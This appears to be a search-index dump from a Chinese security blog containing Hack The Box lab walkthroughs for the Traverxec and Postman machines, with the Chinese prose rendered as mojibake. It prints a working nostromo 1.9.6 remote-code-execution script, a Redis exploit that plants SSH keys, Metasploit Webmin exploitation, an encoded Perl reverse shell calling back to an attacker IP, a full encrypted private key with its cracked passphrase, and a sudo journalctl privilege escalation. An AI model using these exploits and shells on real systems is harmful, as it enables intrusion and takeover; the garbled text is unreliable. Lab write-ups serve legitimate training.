‡åˆ‡æ¢åˆ°å…¶ä»–panesï¼Œç±»ä¼¼Vim &lt;prefix&gt; H, &lt;prefix&gt; J, &lt;prefix&gt; K, &lt;prefix&gt; L let you resize panes &lt;prefix&gt; &lt; and &lt;prefix&gt; &gt; äº¤æ¢panesä½ç½® &lt;prefix&gt; + å½“å‰paneså…¨å±æ˜¾ç¤ºï¼Œå†ä½¿ç”¨ä¸€æ¬¡ä¼šå˜å›åŸæ¥å¤§å° &lt;prefix&gt; m æ˜¯å¦å¯ç”¨é¼ æ ‡æ¨¡å¼ &lt;prefix&gt; U launches Urlview (if available) &lt;prefix&gt; F launches Facebook PathPicker (if available) &lt;prefix&gt; Enter è¿›å…¥å¤åˆ¶æ¨¡å¼ &lt;prefix&gt; b åˆ—å‡ºå‰ªåˆ‡æ¿ä¸­çš„å†…å®¹ &lt;prefix&gt; p ç²˜è´´å‰ªåˆ‡æ¿ä¸­çš„ç¬¬ä¸€æ¡å†…å®¹ &lt;prefix&gt; P ä»å‰ªåˆ‡æ¿ä¸­é€‰æ‹©å†…å®¹ç²˜è´´","tags":[{"name":"Tmux","slug":"Tmux","permalink":"http://ca0y1h.top/tags/Tmux/"}],"categories":[{"name":"æŠ€æœ¯éšç¬”","slug":"æŠ€æœ¯éšç¬”","permalink":"http://ca0y1h.top/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"}]},{"title":"HTB::Traverxec Walkthrough","date":"2020-02-14T12:04:33.000Z","path":"Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough/","text":"HTB::Traverxec Walkthrough 0x01 Introduction 0x02 Tools and Tips nmap searchexploit nostromo 1.9.6 LinEnum.sh JohnTheRipper GTFObins 0x03 Penetration Test nmapæ‰«æç«¯å£ï¼š 123456789101112131415Nmap scan report for 10.10.10.165Host is up (0.083s latency).Not shown: 65533 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey:| 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)| 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)|_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)80/tcp open http nostromo 1.9.6|_http-server-header: nostromo 1.9.6|_http-title: TRAVERXECService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results athttps://nmap.org/submit/ . æµè§ˆå™¨æ‰“å¼€10.10.10.165ï¼Œæœ‰ä¸€ä¸ªå‘é‚®ä»¶çš„åŠŸèƒ½ï¼š å¤šæ¬¡æµ‹è¯•å‘ç°æ²¡ä»€ä¹ˆç”¨ï¼Œæ„Ÿè§‰è¿™ä¸ªç½‘ç«™æ˜¯ä¸ªåŠæˆå“ã€‚ä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°ä»–ç”¨çš„ä¸­é—´ä»¶æ˜¯nostromo 1.9.6ï¼ŒæŸ¥ä¸€ä¸‹æœ‰æ²¡æœ‰ç›¸å…³çš„exploit åˆšå¥½æœ‰ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œçš„æ¼æ´å¯ä»¥åˆ©ç”¨ã€‚ ç›´æ¥åˆ©ç”¨è·å–shell å†è¿”å›ä¸€ä¸ªäº¤äº’å¼shellï¼Œpython -c &quot;import pty;pty.spawn('/bin/bash')&quot; åœ¨æœ¬æœºä¸Šå¯åŠ¨ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå°†ææƒè„šæœ¬ä¼ åˆ°é¶æœºï¼š ç»™æ‰§è¡Œæƒé™ï¼šchmod +x LinEnum.shï¼Œæ‰§è¡Œè„šæœ¬./LinEnum.shï¼š å‘ç°æœ‰ä¸€ä¸ªdavidç”¨æˆ·ï¼Œè¿˜æ‰¾åˆ°äº†ä¸€ä¸ªå¯†ç ï¼š ç”¨JohnTheRipperå°è¯•è§£å¯†ï¼š å°è¯•ç”¨Nowonly4meè¿æ¥sshä»¥åŠsuå¯†ç å‘ç°éƒ½ä¸æ­£ç¡®ã€‚å¹¶ä¸”ä¸èƒ½ç›´æ¥cdè¿›å…¥/home/davidç›®å½•ã€‚Googleäº†ä¸€ä¸‹æ€è·¯ï¼Œç½‘ä¸Šè¯´ä»”ç»†çœ‹çœ‹é…ç½®æ–‡ä»¶ï¼š åœ¨HOMEDIRSä¸­é…ç½®ä¸€ä¸ªhomedirs_publicè·¯å¾„ï¼Œè¯•ä¸€ä¸‹çœ‹èƒ½ä¸èƒ½è¿›å…¥ï¼š å‘ç°äº†ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œåœ¨/tmpç›®å½•ä¸‹è§£å‹ï¼š æŠŠè¿™ä¸ªå¯†é’¥copyåˆ°ä¸»æœºç”¨JohnTheRipperçˆ†ç ´ï¼š çˆ†ç ´å‡ºå¯†é’¥çš„è®¤è¯å¯†ç hunterï¼Œç”¨SSHè¿æ¥ï¼Œå¾—åˆ°user.txtï¼š 123456789101112131415david@traverxec:~$ cd /home/david/david@traverxec:~$ ls -latotal 36drwx--x--x 5 david david 4096 Oct 25 17:02 .drwxr-xr-x 3 root root 4096 Oct 25 14:32 ..lrwxrwxrwx 1 root root 9 Oct 25 16:15 .bash_history -&gt; /dev/null-rw-r--r-- 1 david david 220 Oct 25 14:32 .bash_logout-rw-r--r-- 1 david david 3526 Oct 25 14:32 .bashrcdrwx------ 2 david david 4096 Oct 25 16:26 bin-rw-r--r-- 1 david david 807 Oct 25 14:32 .profiledrwxr-xr-x 3 david david 4096 Oct 25 15:45 public_wwwdrwx------ 2 david david 4096 Oct 25 17:02 .ssh-r--r----- 1 root david 33 Oct 25 16:14 user.txtdavid@traverxec:~$ cat user.txt7db0b[--------------------]d9782f3d åœ¨è¿™ä¸ªç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ªbinæ–‡ä»¶å¤¹ï¼š æˆ‘ä»¬åŸºæœ¬ä¸Šçœ‹åˆ°å®ƒåªæ˜¯è¾“å‡ºä¸€ä¸ªHEADï¼ˆbinç›®å½•ä¸­çš„å¦ä¸€ä¸ªæ–‡ä»¶ï¼‰å’Œæœ‰å…³æœåŠ¡å™¨çš„ä¸€äº›ä¿¡æ¯ã€‚ è¯¥è„šæœ¬çš„æœ€åä¸€è¡Œæ˜¯æœ€é‡è¦çš„ï¼Œå®ƒå…ˆè¿è¡Œsudoï¼Œç„¶åè¿è¡Œjournalctlï¼Œä¹Ÿå°±æ˜¯è¯´journalctlæ­£åœ¨ä»¥rootçš„ç‰¹æƒè¿è¡Œï¼Œå› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶journalctlä¹Ÿå°±æ‹¥æœ‰rootç‰¹æƒã€‚ ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¼¼ä¹æ— æ³•æ›´æ”¹ä»»ä½•å‚æ•°ã€‚ è¿è¡Œé™¤sudo journalctl -n5 -unostromo.serviceä»¥å¤–çš„ä»»ä½•å†…å®¹æ—¶ï¼Œå°†è¦æ±‚æä¾›å¯†ç ã€‚ æ²¡ä»€ä¹ˆæ€è·¯ï¼Œåªèƒ½å†ä¸€æ¬¡æ±‚åŠ©Googleï¼Œæç¤ºæˆ‘ä»¬ç”¨GTFObinsï¼š è¿è¡Œ/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.serviceæ—¶ï¼ŒæŠŠçª—å£ç¼©å°ä¸€ç‚¹ï¼Œå†è¾“å…¥!/bin/shï¼ŒæˆåŠŸè·å¾—rootæƒé™ï¼š 0x04 Summary Traverxecæ˜¯ä¸€ä¸ªåŸºäºLinuxçš„é¶æœºï¼Œå¼€æ”¾äº†æ™®é€šçš„22å’Œ80ç«¯å£ï¼Œ80ç«¯å£ä¸Šè¿è¡Œçš„ç½‘ç«™æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯ç½‘ç«™çš„ä¸­é—´ä»¶æœåŠ¡nostromo 1.9.6æœ‰ä¸€ä¸ªç›®å½•ç©¿è¶Šç»•è¿‡è¿›è€Œé€ æˆä»£ç æ‰§è¡Œçš„æ¼æ´ï¼Œä»¥www-dataæƒé™è¿›å…¥é¶æœºåï¼Œå‘ç°/home/davidç›®å½•ä¸å¯è¾¾ã€‚ä½†æ˜¯æŸ¥çœ‹nostromoæ–‡æ¡£å‘ç°ï¼Œé…ç½®æ–‡ä»¶æœ‰ä¸€ä¸ªHOMEDIRSçš„é€‰é¡¹ï¼Œå…¶ä¸­homedirs_publicå±æ€§æŒ‡å®šäº†ç½‘ç«™çš„ä¸»ç›®å½•ï¼Œå‘ç°/home/david/pulic_www/æ˜¯å¯è¾¾çš„ï¼Œé‡Œé¢æœ‰davidçš„ç§é’¥ã€‚ææƒçš„è¿‡ç¨‹æŸ¥äº†ä¸€ä¸‹Googleï¼Œå‘ç°/home/david/binç›®å½•ä¸‹æœ‰ä¸€ä¸ªè„šæœ¬ï¼Œè€Œä¸”/usr/bin/journalctlæ˜¯ä½œä¸º root è¿è¡Œçš„ï¼ŒæŸ¥çœ‹ GTFObinsï¼Œå‘ç°é€šè¿‡ sudo è¿è¡Œçš„ journalctl å¯ä»¥è¢«åˆ©ç”¨æ¥ææƒï¼Œç¼©å°çª—å£è¿›è€Œè§¦å‘pagerï¼Œè·å¾—rootæƒé™ã€‚ 0x05 nostromo 1.9.6 exploit æºç åˆ†æä¸€ä¸‹nostromo 1.9.6çš„ç›®å½•ç©¿è¶Šæ¼æ´ã€‚å…ˆè´´ä¸Šåˆ©ç”¨ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435help_menu = &#x27;\\r\\nUsage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;&#x27;def connect(soc): response = &quot;&quot; try: while True: connection = soc.recv(1024) if len(connection) == 0: break response += connection except: pass return responsedef cve(target, port, cmd): soc = socket.socket() soc.connect((target, int(port))) payload = &#x27;POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\\r\\nContent-Length: 1\\r\\n\\r\\necho\\necho\\n&#123;&#125; 2&gt;&amp;1&#x27;.format(cmd) soc.send(payload) receive = connect(soc) print(receive)if __name__ == &quot;__main__&quot;: print(art) try: target = sys.argv[1] port = sys.argv[2] cmd = sys.argv[3] cve(target, port, cmd) except IndexError: print(help_menu) é¦–å…ˆï¼ŒæœåŠ¡å™¨ä¼šéªŒè¯è¯·æ±‚ç„¶åå¤„ç†å®ƒã€‚ åœ¨ä¸Šå›¾çš„å‡½æ•°http_verify()ä¸­ï¼Œè¯·æ±‚çš„é¦–è¡Œä¼šå…ˆè¿›è¡Œè§£ç ï¼Œç„¶åæ£€æŸ¥/../æ˜¯å¦å­˜åœ¨ã€‚æ³¨æ„ï¼Œæ­¤æ—¶æ”»å‡»è¯·æ±‚çš„é¦–è¡ŒåŒ…å«/.\\r./.\\r./.\\r./.\\r./bin/shã€‚ æ¥ä¸‹æ¥ï¼Œå‡½æ•°http_proc()ä¼šå°†é¦–è¡Œä¼ é€’ç»™å‡½æ•°http_header()ã€‚ æ¼æ´æ ¹æºå°±åœ¨è¿™ï¼Œå‡½æ•°http_header()ä¼šé€šè¿‡å‡½æ•°strcutl()è§£ææ•°æ®ã€‚ è€Œåœ¨å‡½æ•°strcutl()çš„å†…éƒ¨ï¼Œä½ å¯ä»¥çœ‹åˆ°å®ƒä¼šæŠŠå­—ç¬¦ä¸²ä¸­çš„\\rï¼ˆå›è½¦ï¼‰å»é™¤ã€‚ æœ€åï¼Œå¾—åˆ°çš„è·¯å¾„æ˜¯/../../../../bin/shã€‚é‚£ä¹ˆï¼Œç›®å½•ç©¿è¶Šå®Œæˆï¼Œå‘½ä»¤æ‰§è¡Œå¦‚ä½•è¿›è¡Œå‘¢ï¼Ÿåœ¨å‡½æ•°http_proc()ä¸­çš„execve()å‡½æ•°ï¼ˆç”¨äºæ‰§è¡ŒæŒ‡å®šç¨‹åºï¼‰ä¸­ï¼Œå®ƒæ‰§è¡Œäº†rh-&gt;rq_filefï¼Œè¿™æ­£æ˜¯è·¯å¾„è¿‡æ»¤åçš„ç»“æœ/../../../../bin/shã€‚ äºæ˜¯ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªå¯å¯¼è‡´RCEçš„ç›®å½•ç©¿è¶Šã€‚ ä¸å¾—ä¸è¯´å‘ç°è¿™ä¸ªæ¼æ´çš„å¸ˆå‚…ä»£ç å®¡è®¡èƒ½åŠ›çœŸå¼ºï¼Œæˆ‘ä»¬éƒ½æ˜¯å¼Ÿå¼Ÿã€‚ 0x05 Reference https://blog.csdn.net/JBlock/article/details/88619117","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::Postman Walkthrough","date":"2020-02-11T11:24:00.000Z","path":"Target_drone/HackTheBox/2.HTB-Postman-walkthrough/","text":"HTB::Postman Walkthrough 0x01 é¶æœºä»‹ç» 0x02 ä½¿ç”¨å·¥å…·å’ŒçŸ¥è¯†ç‚¹ nmap redis server LinEnum.sh ssh2john.py John lse.sh webmin_packageup_rce 0x03 æ¸—é€è¿‡ç¨‹ æ‰«æç›®æ ‡ä¸»æœºæ‰€æœ‰ç«¯å£ï¼š 123456789101112131415161718kali@kali:~$ nmap -A -Pn -T4 -p- 10.10.10.160Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-09 23:18 ESTNmap scan report for postman.htb (10.10.10.160)Host is up (0.34s latency).Not shown: 65531 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)| 256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)|_ 256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: The Cyber Geek&#x27;s Personal Website6379/tcp open redis Redis key-value store 4.0.910000/tcp open http MiniServ 1.910 (Webmin httpd)|_http-server-header: MiniServ/1.910|_http-trane-info: Problem with XML parsing of /evox/aboutService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ä¸»è¦æ¥çœ‹ä¸€ä¸‹80ã€6379å’Œ10000ç«¯å£ã€‚ 80ç«¯å£ï¼š 6379ç«¯å£ï¼š 10000ç«¯å£ï¼š é€šå¸¸80ç«¯å£æ²¡æœ‰ä»€ä¹ˆåˆ©ç”¨çš„ä¸œè¥¿ï¼Œ10000ç«¯å£ä¸Šè¿è¡ŒWebminæœåŠ¡å°è¯•å¼±å£ä»¤æ²¡æœ‰æ•ˆæœï¼Œè€ŒredisæœåŠ¡æš´éœ²åœ¨6379ç«¯å£ï¼Œå¯ä»¥ä»è¿™é‡Œä¸‹æ‰‹ï¼ŒGoogleredis key store 4.0.9 expolitï¼Œæ‰¾åˆ°ä¸‹é¢åˆ©ç”¨æ–¹å¼ https://github.com/Avinash-acid/Redis-Server-Exploit 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#!/usr/bin/python#Author : Avinash Kumar Thapa aka -Acid#Twitter : https://twitter.com/m_avinash143#####################################################################################################################################################import osimport os.pathfrom sys import argvfrom termcolor import coloredscript, ip_address, username = argvPATH=&#x27;/usr/bin/redis-cli&#x27;PATH1=&#x27;/usr/local/bin/redis-cli&#x27;def ssh_connection(): shell = &quot;ssh -i &quot; + &#x27;$HOME/.ssh/id_rsa &#x27; + username+&quot;@&quot;+ip_address os.system(shell)if os.path.isfile(PATH) or os.path.isfile(PATH1): try: print colored(&#x27;\\t*******************************************************************&#x27;, &quot;green&quot;) print colored(&#x27;\\t* [+] [Exploit] Exploiting misconfigured REDIS SERVER*&#x27; ,&quot;green&quot;) print colored(&#x27;\\t* [+] AVINASH KUMAR THAPA aka &quot;-Acid&quot; &#x27;, &quot;green&quot;) print colored(&#x27;\\t*******************************************************************&#x27;, &quot;green&quot;) print &quot;\\n&quot; print colored(&quot;\\t SSH Keys Need to be Generated&quot;, &#x27;blue&#x27;) os.system(&#x27;ssh-keygen -t rsa -C \\&quot;acid_creative\\&quot;&#x27;) print colored(&quot;\\t Keys Generated Successfully&quot;, &quot;blue&quot;) os.system(&quot;(echo &#x27;\\r\\n\\&#x27;; cat $HOME/.ssh/id_rsa.pub; echo \\&#x27;\\r\\n\\&#x27;) &gt; $HOME/.ssh/public_key.txt&quot;) cmd = &quot;redis-cli -h &quot; + ip_address + &#x27; flushall&#x27; cmd1 = &quot;redis-cli -h &quot; + ip_address os.system(cmd) cmd2 = &quot;cat $HOME/.ssh/public_key.txt | redis-cli -h &quot; + ip_address + &#x27; -x set cracklist&#x27; os.system(cmd2) cmd3 = cmd1 + &#x27; config set dbfilename &quot;backup.db&quot; &#x27; cmd4 = cmd1 + &#x27; config set dir&#x27; + &quot; /usr/lib/&quot;+username+&quot;/.ssh/&quot; cmd5 = cmd1 + &#x27; config set dbfilename &quot;authorized_keys&quot; &#x27; cmd6 = cmd1 + &#x27; save&#x27; os.system(cmd3) os.system(cmd4) os.system(cmd5) os.system(cmd6) print colored(&quot;\\tYou&#x27;ll get shell in sometime..Thanks for your patience&quot;, &quot;green&quot;) ssh_connection() except: print &quot;Something went wrong&quot;else: print colored(&quot;\\tRedis-cli:::::This utility is not present on your system. You need to install it to proceed further.&quot;, &quot;red&quot;) æ‰§è¡Œpython2 exp.py 10.10.10.160 redisï¼ŒSSHç™»å½•é¶æœºï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051kali@kali:~/Desktop/HTB Scripts/Redis$ python2 exp.py 10.10.10.160 redis ******************************************************************* * [+] [Exploit] Exploiting misconfigured REDIS SERVER* * [+] AVINASH KUMAR THAPA aka &quot;-Acid&quot; ******************************************************************* SSH Keys Need to be GeneratedGenerating public/private rsa key pair.Enter file in which to save the key (/home/kali/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/kali/.ssh/id_rsa.Your public key has been saved in /home/kali/.ssh/id_rsa.pub.The key fingerprint is:SHA256:wMzHMZr3ew4dVP3cXrwsWg7JF7ay4peQHLplhK7BDww acid_creativeThe key&#x27;s randomart image is:+---[RSA 3072]----+| o .. || + + o . .|| B = . oo|| E = + . o *|| + . S = + +.o|| = o * B * o.|| = + + % . || . o . O . || ..o . |+----[SHA256]-----+ Keys Generated SuccessfullyOKOKOK(error) ERR Changing directory: No such file or directoryOKOK You&#x27;ll get shell in sometime..Thanks for your patienceWelcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatchFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Mon Feb 10 08:46:56 2020 from 10.10.15.125redis@Postman:~$ pwd/var/lib/redis ç›´æ¥æŸ¥çœ‹/etc/passwdå’Œ/homeç›®å½•ï¼Œå‘ç°æœ‰ä¸€ä¸ªMattç”¨æˆ·ï¼Œè€Œä¸”user.txtæƒé™ä¹Ÿå±äºMattã€‚è®¾æ³•æå‡æƒé™ï¼Œ/optç›®å½•ä¸‹æœ‰ä¸€ä¸ªid_rsa.bakæ–‡ä»¶ï¼š 123456789101112131415161718192021222324252627282930-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287CJehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnXcwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k27GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT91u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcvEyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHPUH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VYSj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYKt+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdkeP2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3GeSbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3il3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8pS9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRRhkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58VXTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrODb6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXiWhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmhKTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92HmnpAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQVcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5WX+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==-----END RSA PRIVATE KEY----- è¿˜å¯ä»¥ç”¨LinEnum.shæ¥æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶ï¼š ç”¨ssh2john.pyè½¬æ¢ä¸ºJohnå¯è¯†åˆ«çš„æ–‡ä»¶ï¼š 1kali@kali:~/Desktop$ /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.hash å†ç”¨Johnæ¥ç ´è§£RSAå¯†ç ï¼š 123456789101112kali@kali:~/Desktop$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hashUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashesCost 2 (iteration count) is 2 for all loaded hashesWill run 2 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statuscomputer2008 (id_rsa)1g 0:00:00:35 DONE (2020-02-10 04:28) 0.02844g/s 408014p/s 408014c/s 408014C/sa6_123..*7Â¡Vamos!Session completed åˆ‡æ¢ä¸ºMattç”¨æˆ·ï¼Œè¯»å–user.txtæ–‡ä»¶ï¼š 12345redis@Postman:~$ su MattPassword: Matt@Postman:/var/lib/redis$ cd /home/Matt/Matt@Postman:~$ cat user.txt 517ad0ec2458ca97af8d93aac08a2f3c è¿™é‡Œä¸èƒ½ç”¨id_rsaç§é’¥æ–‡ä»¶æ¥ç™»å½•é¶æœºï¼Œæ¯æ¬¡ç™»å½•æˆåŠŸåéƒ½ä¼šå‡ºç°Connection close ç”¨lse.shè„šæœ¬æŸ¥çœ‹rootæƒé™è¿è¡Œçš„è¿›ç¨‹ï¼Œå‘ç°åˆåœ¨10000ç«¯å£ä¸Šçš„webminï¼Œç”¨Mattå’Œcomputer2008å¯ä»¥æˆåŠŸç™»å½•ï¼ŒGooglewebmin exploitï¼Œexploit-dbä¸Šæœ‰å¦‚ä¸‹åˆ©ç”¨æ–¹å¼ï¼š https://www.exploit-db.com/exploits/46984 metasploitä¹Ÿæ”¶å½•è¿™ä¸ªæ¼æ´ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738Module options (exploit/linux/http/webmin_packageup_rce): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD computer2008 yes Webmin Password Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.160 yes The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27; RPORT 10000 yes The target port (TCP) SSL true no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Base path for Webmin application USERNAME Matt yes Webmin Username VHOST no HTTP server virtual hostPayload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.4 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Webmin &lt;= 1.910msf5 exploit(linux/http/webmin_packageup_rce) &gt; exploit [*] Started reverse TCP handler on 10.10.14.113:4444 [+] Session cookie: ba61f4eadcffcce039b166a29defa004 [*] Attempting to execute the payload... [*] Command shell session 1 opened (10.10.14.113:4444 -&gt; 10.10.10.160:46990) at 2019-12-24 17:43:52 -0500 cat /root/root.txt a257741[-----------------]ddce å¤§æ¦‚çœ‹äº†ä¸€ä¸‹Payloadçš„åˆ©ç”¨ï¼Œåº”è¯¥æ˜¯Webminåœ¨ç®¡ç†å‡çº§è½¯ä»¶çš„æ—¶å€™é€ æˆäº†å‘½ä»¤æ³¨å…¥ï¼Œæ‰§è¡Œäº†é¢å¤–çš„ç”¨æˆ·å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨Burp Suiteå‘é€Payloadï¼š 123456789101112131415161718192021222324252627282930POST &#x2F;package-updates&#x2F;update.cgi HTTP&#x2F;1.1Host: [RHOST]:[RPORT]User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1)Cookie: sid&#x3D;[INPUT GOOD SID HERE]Referer: [RHOST]:[RPORT]&#x2F;package-updates&#x2F;?xnavigation&#x3D;1Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 432Connection: closeu&#x3D;acl%2Fapt&amp;u&#x3D;[PAYLOAD HERE]-------------------------------------------------------- POC Payload InfoURL decoded | bash -c &quot;&#123;echo,cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4yMjI6NDQ0NCIpO1NURElOLT5mZG9wZW4oJGMscik7JH4tPmZkb3BlbigkYyx3KTt3aGlsZSg8Pil7aWYoJF89fiAvKC4qKS8pe3N5c3RlbSAkMTt9fTsn&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;base64 decodedperl -MIO -e &#39;$p&#x3D;fork;exit,if($p);foreach my $key(keys %ENV)&#123;if($ENV&#123;$key&#125;&#x3D;~&#x2F;(.*)&#x2F;)&#123;$ENV&#123;$key&#125;&#x3D;$1;&#125;&#125;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;10.10.14.222:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;)&#123;if($_&#x3D;~ &#x2F;(.*)&#x2F;)&#123;system $1;&#125;&#125;;&#39;all together decoded | bash -c &quot;&#123;echo,perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);foreach my $key(keys %ENV)&#123;if($ENV&#123;$key&#125;&#x3D;~&#x2F;(.*)&#x2F;)&#123;$ENV&#123;$key&#125;&#x3D;$1;&#125;&#125;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;10.10.14.222:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;)&#123;if($_&#x3D;~ &#x2F;(.*)&#x2F;)&#123;system $1;&#125;&#125;;&#39;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; 0x04 Summary 